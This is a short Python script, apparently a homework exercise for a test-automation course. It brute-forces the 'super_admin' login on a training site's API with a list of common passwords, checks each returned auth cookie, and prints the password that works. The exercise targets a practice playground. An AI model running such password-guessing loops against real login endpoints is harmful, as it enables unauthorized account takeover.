import requests

login_api_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_cookie_api_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
login = "super_admin"
password_list = ["password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football", "1234567",
                 "monkey", "111111", "letmein", "1234", "1234567890", "dragon", "baseball", "sunshine", "iloveyou",
                 "trustno1", "princess", "adobe123[a]", "123123", "welcome", "login", "admin", "qwerty123", "solo",
                 "1q2w3e4r", "master", "666666", "photoshop[a]", "1qaz2wsx", "qwertyuiop", "ashley", "mustang",
                 "121212", "starwars", "654321", "bailey", "access", "flower", "555555", "passw0rd", "shadow", "lovely",
                 "7777777", "michael", "!@#$%^&*", "jesus", "password1", "superman", "hello", "charlie", "888888",
                 "696969", "hottie", "freedom", "aa123456", "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald",
                 "batman", "zaq1zaq1", "000000", "123qwe"]

for password in password_list:
    response1 = requests.post(login_api_url, data={"login": login, "password": password})
    response1_cookies_value = response1.cookies.get('auth_cookie')
    response1_cookies = {"auth_cookie": response1_cookies_value}
    response2 = requests.post(check_cookie_api_url, cookies=response1_cookies)
    if response2.text != "You are NOT authorized":
        print("Ваш пароль", password)
        break
